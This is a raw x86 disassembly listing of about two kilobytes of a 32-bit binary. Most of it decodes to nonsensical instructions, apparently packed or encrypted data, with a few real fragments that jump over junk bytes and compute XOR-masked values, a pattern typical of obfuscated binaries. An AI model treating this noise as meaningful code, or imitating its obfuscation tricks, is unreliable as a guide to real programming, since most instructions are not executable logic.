  410897:	ror    DWORD PTR [edi+0x26],0x6
  41089b:	pop    edi
  41089c:	shl    BYTE PTR [eax],cl
  41089e:	mov    eax,ds:0x84218e91
  4108a3:	ret    
  4108a4:	into   
  4108a5:	cmp    eax,0xc6a3972c
  4108aa:	jl     0x41083e
  4108ac:	jmp    0x6191209e
  4108b1:	and    DWORD PTR [ecx+0x4df28b6a],edi
  4108b7:	lods   eax,DWORD PTR ds:[esi]
  4108b8:	into   
  4108b9:	pop    esi
  4108ba:	out    dx,al
  4108bb:	hlt    
  4108bc:	pop    eax
  4108bd:	mov    esi,0x10296219
  4108c2:	inc    ebx
  4108c3:	jno    0x410864
  4108c5:	ins    BYTE PTR es:[edi],dx
  4108c6:	push   cs
  4108c7:	lds    eax,FWORD PTR [ecx]
  4108c9:	xor    al,0xd6
  4108cb:	pop    esi
  4108cc:	dec    esi
  4108cd:	push   edi
  4108ce:	cmp    eax,edi
  4108d0:	jmp    0xece785bb
  4108d5:	mov    dh,dh
  4108d7:	sbb    bh,bh
  4108d9:	xchg   esi,eax
  4108da:	sub    al,0xda
  4108dc:	mov    cl,0x7f
  4108de:	pop    es
  4108df:	inc    edi
  4108e0:	jae    0x410953
  4108e2:	lahf   
  4108e3:	jg     0x41087a
  4108e5:	aaa    
  4108e6:	test   DWORD PTR [esi-0x7de72c3a],esi
  4108ec:	inc    BYTE PTR [edx+ebp*1-0x23]
  4108f0:	push   ebp
  4108f1:	push   0x1ea046bc
  4108f6:	jmp    0x4108ec
  4108f8:	ret    0x5057
  4108fb:	bswap  ebp
  4108fd:	cli    
  4108fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ff:	aaa    
  410900:	sbb    eax,0xdb6664e8
  410905:	push   edx
  410906:	lods   al,BYTE PTR ds:[esi]
  410907:	xchg   ebx,eax
  410908:	cmp    ebx,eax
  41090a:	dec    edx
  41090b:	push   esp
  41090c:	call   0x2d4d:0x71498d
  410913:	idiv   BYTE PTR [eax+ebx*8]
  410916:	inc    esi
  410917:	icebp  
  410918:	cmc    
  410919:	pop    esi
  41091a:	loop   0x4108c1
  41091c:	mov    ds:0xe903fdfc,eax
  410921:	push   edx
  410922:	add    al,0x4d
  410924:	and    DWORD PTR [ebp-0xb],ebp
  410927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410928:	add    ch,ch
  41092a:	(bad)  
  41092b:	ja     0x410988
  41092d:	cwde   
  41092e:	addr16 out dx,al
  410930:	add    eax,0x3d095c7d
  410935:	lods   eax,DWORD PTR ds:[esi]
  410936:	adc    ecx,edi
  410938:	pop    eax
  410939:	mov    ebp,DWORD PTR [ebx]
  41093b:	inc    ecx
  41093c:	neg    BYTE PTR [ecx-0x583b39c4]
  410942:	mov    ch,0x1
  410944:	rol    eax,0x70
  410947:	loopne 0x4109ac
  410949:	xor    eax,0xb6eb8500
  41094e:	mov    edx,0xf61c77e4
  410953:	(bad)  
  410955:	loop   0x41098b
  410957:	jnp    0x41099f
  410959:	cwde   
  41095a:	mov    eax,ds:0x2d807ea
  41095f:	cli    
  410960:	inc    ebp
  410961:	in     al,dx
  410962:	iret   
  410963:	ror    DWORD PTR [ebx-0xb],cl
  410966:	das    
  410967:	and    al,0xfc
  410969:	out    dx,eax
  41096a:	dec    eax
  41096b:	inc    eax
  41096c:	mov    ds:0x8cb68e2e,al
  410971:	aam    0x19
  410973:	push   0x1eea132d
  410978:	add    DWORD PTR [edi+ebp*8-0x735da0f6],ecx
  41097f:	jecxz  0x4109c6
  410981:	xor    bh,BYTE PTR [edx-0x51e69082]
  410987:	inc    ecx
  410988:	mov    cl,0xe9
  41098a:	pop    esp
  41098b:	retf   
  41098c:	into   
  41098d:	dec    eax
  41098e:	test   BYTE PTR [ebx+0x19da1a69],dh
  410994:	adc    esi,DWORD PTR [ebp-0x42ef7294]
  41099a:	pop    es
  41099b:	pop    ss
  41099c:	jae    0x4109ba
  41099e:	rcr    BYTE PTR [ecx+0x49],cl
  4109a1:	jg     0x4109d6
  4109a3:	fcmovb st,st(7)
  4109a5:	repnz mov dl,0x4b
  4109a8:	and    ecx,DWORD PTR [edi+0x25fe2d45]
  4109ae:	sbb    cl,BYTE PTR [edx+0x2e6ab6f2]
  4109b4:	loop   0x410a1c
  4109b6:	mov    edi,ebp
  4109b8:	lods   eax,DWORD PTR ds:[esi]
  4109b9:	or     dh,al
  4109bb:	leave  
  4109bc:	jg     0x4109c1
  4109be:	inc    edi
  4109bf:	adc    edi,DWORD PTR [edi+0x7d4f389e]
  4109c5:	fisub  WORD PTR ds:[ebx]
  4109c8:	std    
  4109c9:	lahf   
  4109ca:	lods   al,BYTE PTR ds:[esi]
  4109cb:	cmp    al,0x31
  4109cd:	add    ah,ch
  4109cf:	hlt    
  4109d0:	sbb    eax,0x5a17f3d2
  4109d5:	and    DWORD PTR [edi],0x90b2e4dc
  4109db:	imul   eax,esi,0x992fca82
  4109e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e2:	mov    ebp,0xb07c76c2
  4109e7:	clc    
  4109e8:	outs   dx,DWORD PTR ds:[esi]
  4109e9:	iret   
  4109ea:	sti    
  4109eb:	and    BYTE PTR [ecx],bl
  4109ed:	ins    BYTE PTR es:[edi],dx
  4109ee:	mov    eax,0x69347e3d
  4109f3:	jo     0x410a67
  4109f5:	cmp    eax,0x2f3738a5
  4109fa:	pop    ebx
  4109fb:	adc    al,0x34
  4109fd:	push   ebx
  4109fe:	adc    dl,BYTE PTR [edx]
  410a00:	clc    
  410a01:	pop    eax
  410a02:	jecxz  0x410a61
  410a04:	xchg   ebx,eax
  410a05:	or     dl,BYTE PTR [esi+0x61f775ed]
  410a0b:	mov    eax,ds:0x3729ac00
  410a10:	test   eax,0x35b1c95
  410a15:	rcl    DWORD PTR [ebp+0x3419feec],0xa5
  410a1c:	adc    eax,0xec5ff787
  410a21:	mov    edx,0xad1e0bb
  410a26:	mov    eax,ds:0x93c182c6
  410a2b:	mov    edi,0xea394add
  410a30:	scas   al,BYTE PTR es:[edi]
  410a31:	jne    0x410a9c
  410a33:	cmp    eax,0xc8b872c8
  410a38:	dec    edx
  410a39:	xor    esp,DWORD PTR [ecx-0x6d]
  410a3c:	cmp    DWORD PTR [ebx-0x6b57a628],ebp
  410a42:	psrlw  mm1,QWORD PTR [eax+ebp*4-0x42]
  410a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a48:	inc    edx
  410a49:	cli    
  410a4a:	je     0x4109e9
  410a4c:	in     al,dx
  410a4d:	jmp    0xd4116c86
  410a52:	and    al,0xe2
  410a54:	outs   dx,BYTE PTR ds:[esi]
  410a55:	and    BYTE PTR [ecx-0x6084b044],bl
  410a5b:	or     BYTE PTR [eax-0x18],dh
  410a5e:	fcomip st,st(6)
  410a60:	pop    esi
  410a61:	test   DWORD PTR [ecx+esi*8],esp
  410a64:	inc    ebx
  410a65:	imul   ecx,DWORD PTR [ebp+0x42cc4ffe],0x50
  410a6c:	shl    DWORD PTR [eax+0x64b8af48],1
  410a72:	sbb    al,0xad
  410a74:	in     al,0x28
  410a76:	fucomip st,st(7)
  410a78:	or     DWORD PTR [eax+0x753bc79a],edi
  410a7e:	out    dx,al
  410a7f:	sti    
  410a80:	call   DWORD PTR [edx+0x48]
  410a83:	popf   
  410a84:	inc    ebx
  410a85:	xor    DWORD PTR [ebp-0x3aba3dde],eax
  410a8b:	sub    eax,0xc47f6da3
  410a90:	ret    
  410a91:	mov    al,BYTE PTR [edx]
  410a93:	jo     0x410a45
  410a95:	rol    bh,0x12
  410a98:	add    DWORD PTR [ebp+0x113cdb8b],0x5e
  410a9f:	xchg   ecx,eax
  410aa0:	sahf   
  410aa1:	mov    ch,0xf1
  410aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aa4:	cs or  esp,esi
  410aa7:	dec    ebp
  410aa8:	xchg   ebp,eax
  410aa9:	mov    eax,ds:0x715837f1
  410aae:	mov    DWORD PTR [ecx+0x46b75eb0],eax
  410ab4:	rcr    edi,1
  410ab6:	js     0x410adf
  410ab8:	push   ebp
  410ab9:	add    BYTE PTR [ebp+0x1],0xe3
  410abd:	cs xchg esp,eax
  410abf:	loopne 0x410a69
  410ac1:	mov    ds:0xddac20a5,eax
  410ac6:	repnz pop edx
  410ac8:	push   ecx
  410ac9:	jb     0x410aa5
  410acb:	lea    ebx,[eax-0x20]
  410ace:	fwait
  410acf:	or     al,0x6c
  410ad1:	outs   dx,DWORD PTR ds:[esi]
  410ad2:	(bad)  
  410ad3:	push   ebx
  410ad4:	hlt    
  410ad5:	xchg   edi,eax
  410ad6:	or     eax,DWORD PTR [esi]
  410ad8:	xchg   esi,eax
  410ad9:	jne    0x410b27
  410adb:	sub    ebp,0x396ca582
  410ae1:	sbb    cl,BYTE PTR [eax]
  410ae3:	inc    eax
  410ae4:	and    cl,ah
  410ae6:	sti    
  410ae7:	dec    esi
  410ae8:	push   esi
  410ae9:	pop    DWORD PTR [ebx]
  410aeb:	pop    edx
  410aec:	pop    ss
  410aed:	sbb    eax,0x62e51dd6
  410af2:	stos   BYTE PTR es:[edi],al
  410af3:	xor    eax,0xb98db492
  410af8:	cs jne 0x410b41
  410afb:	ror    DWORD PTR [ebp-0x62ada7f6],cl
  410b01:	leave  
  410b02:	in     eax,dx
  410b03:	add    al,0x9a
  410b05:	dec    ebp
  410b06:	repz cld 
  410b08:	and    eax,0xf7bdb2d4
  410b0d:	or     eax,0x34f7eb29
  410b12:	mov    ch,0x15
  410b14:	ss mov dh,dh
  410b17:	jge    0x410b80
  410b19:	sub    BYTE PTR [edx],dl
  410b1b:	cmp    edx,ebp
  410b1d:	sti    
  410b1e:	push   ecx
  410b1f:	idiv   DWORD PTR [ebp-0x15]
  410b22:	call   0xa82d:0xb432062b
  410b29:	popa   
  410b2a:	dec    edi
  410b2b:	dec    eax
  410b2c:	dec    esp
  410b2d:	(bad)  
  410b2e:	shr    DWORD PTR [ecx],cl
  410b30:	repnz sbb ebp,DWORD PTR [ecx+0x163e5e84]
  410b37:	cdq    
  410b38:	ins    BYTE PTR es:[edi],dx
  410b39:	xor    DWORD PTR [ebx],ebx
  410b3b:	xor    DWORD PTR [ebp+0xcbc3dff],esi
  410b41:	popa   
  410b42:	jns    0x410b7e
  410b44:	jg     0x410b57
  410b46:	das    
  410b47:	rcl    DWORD PTR [ecx+0xc96482c],0x8a
  410b4e:	sbb    BYTE PTR [ebp-0x58],cl
  410b51:	pusha  
  410b52:	add    al,BYTE PTR [ecx-0x45]
  410b55:	invd   
  410b57:	fiadd  DWORD PTR [esi]
  410b59:	or     al,0xc3
  410b5b:	xchg   dh,ch
  410b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b5e:	xchg   BYTE PTR [edi+0x5d],ah
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz pop eax
  410ba5:	ds fdivrp st(7),st
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b33
  410bb1:	outs   dx,DWORD PTR ds:[esi]
  410bb2:	push   eax
  410bb3:	mov    bh,0x33
  410bb5:	mov    esp,0x46c97fe5
  410bba:	leave  
  410bbb:	rol    BYTE PTR [ebx+ecx*8+0x7f],0x26
  410bc0:	xchg   esi,eax
  410bc1:	cmp    DWORD PTR [ecx-0xc366d81],esp
  410bc7:	inc    ecx
  410bc8:	or     eax,DWORD PTR [eax]
  410bca:	add    edx,DWORD PTR [ecx-0x56]
  410bcd:	dec    esp
  410bce:	adc    eax,0xde9763d2
  410bd3:	sti    
  410bd4:	cmp    al,0x67
  410bd6:	adc    DWORD PTR [edx-0x1edb88b6],ebx
  410bdc:	mov    ah,0x62
  410bde:	es out 0xcc,eax
  410be1:	leave  
  410be2:	in     al,dx
  410be3:	xor    edx,DWORD PTR [eax+0x1e]
  410be6:	cwde   
  410be7:	or     al,0xc5
  410be9:	and    BYTE PTR [ebx],ch
  410beb:	enter  0x983f,0xfe
  410bef:	dec    edi
  410bf0:	mov    ebx,0x26e2e953
  410bf5:	div    DWORD PTR [eax-0x3b]
  410bf8:	xlat   BYTE PTR ds:[ebx]
  410bf9:	jle    0x410c3b
  410bfb:	sub    ch,ch
  410bfd:	push   ds
  410bfe:	xchg   esp,eax
  410bff:	pop    edx
  410c00:	xchg   DWORD PTR gs:[edi-0x3f],edx
  410c04:	inc    ch
  410c06:	mov    bh,0x75
  410c08:	cmc    
  410c09:	push   cs
  410c0a:	xchg   ebx,eax
  410c0b:	lock ret 
  410c0d:	adc    eax,0xb7ba3d9d
  410c12:	mov    esp,DWORD PTR [eax-0x3bb4387b]
  410c18:	jbe    0x410c5e
  410c1a:	cmp    BYTE PTR [ecx+edi*1],bl
  410c1d:	xchg   ebp,eax
  410c1e:	sub    DWORD PTR [edi],ebp
  410c20:	lds    ebx,FWORD PTR [ebx+0x5e95d721]
  410c26:	cli    
  410c27:	mov    dl,0x55
  410c29:	xor    DWORD PTR [edx+0x6a48166a],ebx
  410c2f:	pushf  
  410c30:	or     eax,0x3a324d6d
  410c35:	imul   eax,DWORD PTR [eax],0x49
  410c38:	add    eax,0x2fc57966
  410c3d:	jnp    0x410bef
  410c3f:	xor    eax,0xe6acf15d
  410c44:	inc    ebx
  410c45:	in     al,dx
  410c46:	cmp    al,0xbf
  410c48:	push   esi
  410c49:	aaa    
  410c4a:	daa    
  410c4b:	jmp    0xaa55:0xf2cd9c3e
  410c52:	mov    ds:0x56799ff7,al
  410c57:	icebp  
  410c58:	arpl   dx,di
  410c5a:	mov    edi,DWORD PTR [esp+eax*4]
  410c5d:	adc    ecx,DWORD PTR [edx+0x68]
  410c60:	inc    eax
  410c61:	push   edi
  410c62:	mov    ds:0xe40d6ac1,al
  410c67:	mov    ebp,0x75895478
  410c6c:	adc    edi,DWORD PTR gs:[esi+0x44]
  410c70:	(bad)  
  410c71:	jl     0x410c88
  410c73:	cmp    esp,esp
  410c75:	leave  
  410c76:	inc    ecx
  410c77:	jno    0x410c84
  410c79:	sbb    edi,edx
  410c7b:	mov    esp,0xc564cf52
  410c80:	fisubr DWORD PTR [ecx+0x3615fac9]
  410c86:	mov    bh,0x11
  410c88:	lock shl BYTE PTR [esp+esi*2+0x30],1
  410c8d:	adc    DWORD PTR [eax],eax
  410c8f:	popa   
  410c90:	push   ds
  410c91:	add    al,BYTE PTR [eax]
  410c93:	xor    esi,DWORD PTR [esi]
  410c95:	cdq    
  410c96:	fist   DWORD PTR [edi+0x1a]
  410c99:	js     0x410cb7
  410c9b:	jmp    0x410c3b
  410c9d:	out    0x12,al
  410c9f:	sbb    eax,0x4b16f2a
  410ca4:	mov    al,ds:0xbd6bb9c9
  410ca9:	add    al,ah
  410cab:	push   edx
  410cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cae:	inc    eax
  410caf:	push   esp
  410cb0:	or     ah,BYTE PTR [eax+0x22]
  410cb3:	lahf   
  410cb4:	mov    dl,ch
  410cb6:	call   FWORD PTR [ebp+0x2ff37eeb]
  410cbc:	mov    edi,edx
  410cbe:	dec    edx
  410cbf:	xchg   ecx,eax
  410cc0:	fidivr DWORD PTR [esi+0x54de71de]
  410cc6:	int3   
  410cc7:	ins    DWORD PTR es:[edi],dx
  410cc8:	nop
  410cc9:	pushf  
  410cca:	push   edi
  410ccb:	cld    
  410ccc:	mov    al,0x8c
  410cce:	ss mov esp,0x802269c1
  410cd4:	lea    ebx,[eax]
  410cd6:	daa    
  410cd7:	pop    esp
  410cd8:	push   eax
  410cd9:	dec    esp
  410cda:	mov    ah,0xe6
  410cdc:	or     DWORD PTR [ebx+0x4899d44c],ebx
  410ce2:	dec    ebx
  410ce3:	push   ebx
  410ce4:	pop    ebx
  410ce5:	mov    edx,0x36ada11a
  410cea:	stc    
  410ceb:	jl     0x410c6e
  410ced:	sbb    DWORD PTR [eax-0x88249e2],esp
  410cf3:	push   edi
  410cf4:	in     eax,dx
  410cf5:	(bad)  
  410cf6:	cmp    BYTE PTR [esi],bl
  410cf8:	(bad)  
  410cf9:	push   es
  410cfa:	xor    al,0x12
  410cfc:	mov    cl,0xcf
  410cfe:	mov    ds:0xe72c4a3c,al
  410d03:	jbe    0x410ce5
  410d05:	aam    0xea
  410d07:	jae    0x410d00
  410d09:	ins    DWORD PTR es:[edi],dx
  410d0a:	or     dl,dh
  410d0c:	cmp    eax,esp
  410d0e:	clc    
  410d0f:	lahf   
  410d10:	in     eax,dx
  410d11:	retf   
  410d12:	scas   eax,DWORD PTR es:[edi]
  410d13:	test   eax,0x772b28fd
  410d18:	dec    ebx
  410d19:	cmp    eax,0x3c6ccd97
  410d1e:	out    0xe8,eax
  410d20:	popa   
  410d21:	xchg   BYTE PTR [eax-0x52],dl
  410d24:	pusha  
  410d25:	mov    bl,0x14
  410d27:	inc    edi
  410d28:	ss and ebx,0xed07766b
  410d2f:	(bad)  
  410d30:	aaa    
  410d31:	shr    DWORD PTR [ecx-0x14],cl
  410d34:	and    ebx,DWORD PTR [ebx]
  410d36:	add    BYTE PTR [ecx+0x65],bl
  410d39:	(bad)  
  410d3a:	loop   0x410d64
  410d3c:	jmp    0x410da6
  410d3e:	mov    eax,0xfaeb27e8
  410d44:	inc    ebx
  410d45:	and    al,0xa1
  410d47:	out    dx,eax
  410d48:	push   ecx
  410d49:	rcr    DWORD PTR [esp+ebp*2+0x5f],cl
  410d4d:	cli    
  410d4e:	lahf   
  410d4f:	jae    0x410d13
  410d51:	nop
  410d52:	sbb    DWORD PTR [ebx+0x46],eax
  410d55:	mov    eax,ds:0x1919925
  410d5a:	xchg   edi,eax
  410d5b:	sub    DWORD PTR [ebp+0x55232a72],esi
  410d61:	xchg   edx,eax
  410d62:	inc    ebp
  410d63:	in     al,0x49
  410d65:	mov    ?,ebx
  410d67:	lods   eax,DWORD PTR ds:[esi]
  410d68:	outs   dx,BYTE PTR ds:[esi]
  410d69:	outs   dx,BYTE PTR ds:[esi]
  410d6a:	xor    eax,0xbab87b12
  410d6f:	repnz xor eax,0x95c24e01
  410d75:	pop    ecx
  410d76:	sub    cl,bh
  410d78:	lds    eax,FWORD PTR [ecx]
  410d7a:	xor    al,0xb9
  410d7c:	cld    
  410d7d:	xchg   al,ch
  410d7f:	cdq    
  410d80:	sub    dh,BYTE PTR [ebp-0x2f7a4629]
  410d86:	add    esp,edi
  410d88:	dec    eax
  410d89:	lods   al,BYTE PTR cs:[esi]
  410d8b:	add    cl,BYTE PTR [ebx+0x4d]
  410d8e:	adc    esi,DWORD PTR [eax+0x38]
  410d91:	jno    0x410dac
  410d93:	xor    dl,bl
  410d95:	cmc    
  410d96:	enter  0x41a1,0x50
  410d9a:	test   eax,0xb88f8fed
  410d9f:	ficomp WORD PTR [ecx]
  410da1:	dec    esi
  410da2:	mov    ds:0x5d7bd26a,al
  410da7:	inc    ecx
  410da8:	mov    ebx,0x31e2879d
  410dad:	jl     0x410d9e
  410daf:	mov    eax,0xeee4a74a
  410db4:	lock mov ds:0xd773a92a,eax
  410dba:	popf   
  410dbb:	push   eax
  410dbc:	or     eax,0x9c211938
  410dc1:	jbe    0x410e13
  410dc3:	mov    edx,0xa523a832
  410dc8:	fsubr  st,st(3)
  410dca:	and    dh,BYTE PTR [edx-0x4246aff0]
  410dd0:	dec    esp
  410dd1:	out    dx,eax
  410dd2:	add    al,0x5c
  410dd4:	sub    BYTE PTR [ebx-0x378e224b],ah
  410dda:	or     ecx,ebx
  410ddc:	ret    0xe3d2
  410ddf:	shl    dh,0xb0
  410de2:	stc    
  410de3:	stos   BYTE PTR es:[edi],al
  410de4:	push   es
  410de5:	push   ecx
  410de6:	jle    0x410e65
  410de8:	ds loopne 0x410d9f
  410deb:	and    dl,BYTE PTR [esi+0x59]
  410dee:	bound  esp,QWORD PTR [ebp+esi*1-0xd]
  410df2:	push   ss
  410df3:	sar    BYTE PTR [ebx-0x13],0x74
  410df7:	push   edi
  410df9:	xchg   edi,eax
  410dfa:	jne    0x410e3f
  410dfc:	int    0x86
  410dfe:	imul   ecx,DWORD PTR [ebp+0x4b0f8b68],0xcb904a30
  410e08:	pop    edx
  410e09:	mov    ah,0x6f
  410e0b:	mov    ds:0x54fbbea2,al
  410e10:	mov    esi,esi
  410e12:	stos   BYTE PTR es:[edi],al
  410e13:	(bad)  
  410e14:	shr    DWORD PTR [ebx+edx*8],cl
  410e17:	jg     0x410e43
  410e19:	sbb    dh,dl
  410e1b:	stos   BYTE PTR es:[edi],al
  410e1c:	add    BYTE PTR [ebx-0x63],ah
  410e1f:	xlat   BYTE PTR ds:[ebx]
  410e20:	test   DWORD PTR [ebx-0x2a],ebx
  410e23:	fist   DWORD PTR [ecx+0x26]
  410e26:	pop    ds
  410e27:	aad    0x49
  410e29:	fnstenv [edx-0x235998dd]
  410e2f:	dec    ebx
  410e30:	jl     0x410e8b
  410e32:	ins    BYTE PTR es:[edi],dx
  410e33:	jb     0x410e05
  410e35:	mov    edi,edx
  410e37:	mov    ebx,0xf7cac876
  410e3c:	iret   
  410e3d:	xlat   BYTE PTR ds:[ebx]
  410e3e:	xchg   esi,eax
  410e3f:	retf   0xc2d7
  410e42:	pusha  
  410e43:	je     0x410e21
  410e45:	cmp    eax,0x6d3e7f19
  410e4a:	and    BYTE PTR [ebx],dl
  410e4c:	js     0x410e53
  410e4e:	xchg   BYTE PTR [edx+0x3f29bcf3],dh
  410e54:	sbb    DWORD PTR [ebx+0x2e],eax
  410e57:	add    ebp,DWORD PTR [eax-0x298c399f]
  410e5d:	shr    DWORD PTR [ebx],1
  410e5f:	adc    eax,0x6cc0fb3a
  410e64:	cmc    
  410e65:	adc    eax,0x7026d33d
  410e6a:	push   0xd
  410e6c:	fldenv [esp+edi*2+0x7e]
  410e70:	cmp    BYTE PTR [eax],dl
  410e72:	fcompp 
  410e74:	sub    ch,BYTE PTR [eax-0x2d8f11bf]
  410e7a:	leavew 
  410e7c:	dec    ebp
  410e7d:	imul   edx,DWORD PTR [ebx-0x45],0x21b9f283
  410e84:	pop    ebx
  410e85:	add    edx,DWORD PTR [ecx+0x5b8e41d5]
  410e8b:	dec    edx
  410e8c:	(bad)  
  410e8d:	push   eax
  410e8e:	jbe    0x410ecf
  410e90:	imul   DWORD PTR [ebx+0x23]
  410e93:	mov    ds,WORD PTR [esi]
  410e95:	es dec edi
  410e97:	outs   dx,DWORD PTR ds:[esi]
  410e98:	dec    ebx
  410e99:	into   
  410e9a:	or     al,bl
  410e9c:	mov    eax,0x135bfd5e
  410ea1:	mov    ebx,0x1d8af50f
  410ea6:	pop    ecx
  410ea7:	and    BYTE PTR [ecx],al
  410ea9:	es and al,0xeb
  410eac:	cmp    ah,BYTE PTR [edi-0x6932a485]
  410eb2:	ins    DWORD PTR es:[edi],dx
  410eb3:	jmp    0xf3fbaf95
  410eb8:	shl    BYTE PTR [ebx+eax*4+0x36],cl
  410ebc:	add    eax,0xc8b9b225
  410ec1:	ins    DWORD PTR es:[edi],dx
  410ec2:	adc    edi,ebp
  410ec4:	fistp  QWORD PTR [ebx+eiz*8-0x32]
  410ec8:	loop   0x410f24
  410eca:	ret    0xc03c
  410ecd:	and    DWORD PTR [esi-0x1fa8b173],esi
  410ed3:	sub    al,0x99
  410ed5:	ds repnz into 
  410ed8:	(bad)  
  410ed9:	or     DWORD PTR [ebx],eax
  410edb:	pushf  
  410edc:	xchg   BYTE PTR [eax+0x237ee64d],bh
  410ee2:	inc    ebx
  410ee3:	arpl   WORD PTR [ecx],dx
  410ee5:	adc    ecx,esp
  410ee7:	push   eax
  410ee8:	and    esp,DWORD PTR [ecx]
  410eea:	mov    al,ds:0x3044b555
  410eef:	jecxz  0x410f41
  410ef1:	or     eax,0x6ba57ca7
  410ef6:	es pop ebx
  410ef8:	push   es
  410ef9:	xor    DWORD PTR [eax-0x4d],edi
  410efc:	adc    bl,BYTE PTR [edx+0x1b]
  410eff:	mov    cl,0x9f
  410f01:	js     0x410f54
  410f03:	cmp    eax,0x15a1ac0b
  410f08:	idiv   bl
  410f0a:	rol    DWORD PTR cs:[edx-0x73],0x8f
  410f0f:	inc    edx
  410f10:	or     dl,BYTE PTR [ecx-0x4]
  410f13:	sbb    ecx,edi
  410f15:	jbe    0x410f00
  410f17:	retf   
  410f18:	inc    edi
  410f19:	push   edi
  410f1a:	ret    
  410f1b:	inc    esp
  410f1c:	icebp  
  410f1d:	pop    es
  410f1e:	or     al,al
  410f20:	adc    eax,0xed1d47c2
  410f25:	dec    ebx
  410f26:	fistp  WORD PTR [ebp+eiz*1+0x0]
  410f2a:	stc    
  410f2b:	dec    eax
  410f2c:	pop    esp
  410f2d:	int    0xfa
  410f2f:	xor    esi,DWORD PTR [edi-0x27b0dd37]
  410f35:	or     al,0x89
  410f37:	add    ch,dh
  410f39:	mov    ah,0xc0
  410f3b:	mov    WORD PTR [edx-0x44],?
  410f3e:	add    eax,0x2f110a98
  410f43:	push   esp
  410f44:	push   ebx
  410f45:	xor    eax,DWORD PTR [eax]
  410f47:	push   ebx
  410f48:	pop    edi
  410f49:	jl     0x410fa7
  410f4b:	sti    
  410f4c:	jbe    0x410f2c
  410f4e:	sbb    DWORD PTR [esi+0x6e1d59c2],edx
  410f54:	mov    al,ds:0x716fa712
  410f59:	sar    DWORD PTR [ecx+0x13],1
  410f5c:	dec    ebp
  410f5d:	aas    
  410f5e:	inc    BYTE PTR [ecx+0x5a5c8335]
  410f64:	jmp    DWORD PTR [ecx+0x41]
  410f67:	mov    ds:0x2e1ef8be,al
  410f6c:	ds jg  0x410f82
  410f6f:	and    eax,DWORD PTR [ecx]
  410f71:	in     al,0xd1
  410f73:	ror    eax,0x5b
  410f76:	adc    ebx,DWORD PTR [ebx+0xb]
  410f79:	xchg   bp,ax
  410f7b:	sub    BYTE PTR [esi+0x31],dh
  410f7e:	hlt    
  410f7f:	ror    al,0x5d
  410f82:	and    DWORD PTR [esi+eax*2],edi
  410f85:	in     al,dx
  410f86:	push   eax
  410f87:	pop    ecx
  410f88:	loopne 0x410f3d
  410f8a:	jge    0x410f91
  410f8c:	pop    ds
  410f8d:	xor    eax,0xc49af2be
  410f92:	adc    al,0xe7
  410f94:	adc    eax,0xa1188bca
  410f99:	sub    al,0xb2
  410f9b:	inc    ecx
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fdee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e19c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x51c87139]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f7c
  410fdd:	inc    edx
  410fde:	test   ah,0x5f
  410fe1:	in     al,dx
  410fe2:	rcl    BYTE PTR [ebx+ebp*2-0x7d7c45e1],0x99
  410fea:	stos   DWORD PTR es:[edi],eax
  410feb:	ret    
  410fec:	xchg   ecx,eax
  410fed:	lods   eax,DWORD PTR ds:[esi]
  410fee:	cld    
  410fef:	jne    0x410ffe
  410ff1:	fnstsw WORD PTR [ecx-0x4]
  410ff4:	pop    ss
  410ff5:	cwde   
  410ff6:	mov    BYTE PTR [ebx-0x71],ah
  410ff9:	jb     0x41100b
  410ffb:	ret    0x9aab
  410ffe:	xchg   BYTE PTR [ecx],cl
  411000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411001:	or     eax,0x835970b
  411006:	push   ds
  411007:	add    dh,BYTE PTR ds:0xaf3c7f60
  41100d:	xchg   BYTE PTR [ebp-0x344310e0],ch
  411013:	sti    
  411014:	sahf   
  411015:	int3   
  411016:	add    dh,BYTE PTR [ecx+edx*1-0x32]
  41101a:	pop    ds
  41101b:	rol    dl,0x72
  41101e:	imul   ebx,DWORD PTR [ecx-0x21],0x1750e83d
  411025:	(bad)  
  411026:	(bad)  
  411027:	mov    bh,0x36
  411029:	push   ebx
  41102a:	xor    esp,0xffffffbb
  41102d:	popa   
  41102e:	popa   
  41102f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411030:	ret    0xcdac
  411033:	inc    ebx
  411034:	ins    BYTE PTR es:[edi],dx
  411035:	mov    ds:0xd866b84d,al
  41103b:	adc    al,BYTE PTR [esi+ebp*8]
  41103e:	mov    cl,0x5c
  411040:	mov    eax,0x76b17262
  411045:	outs   dx,DWORD PTR ds:[esi]
  411046:	data16 adc al,0x86
  411049:	mov    edx,edi
  41104b:	cwde   
  41104c:	loop   0x411092
  41104e:	std    
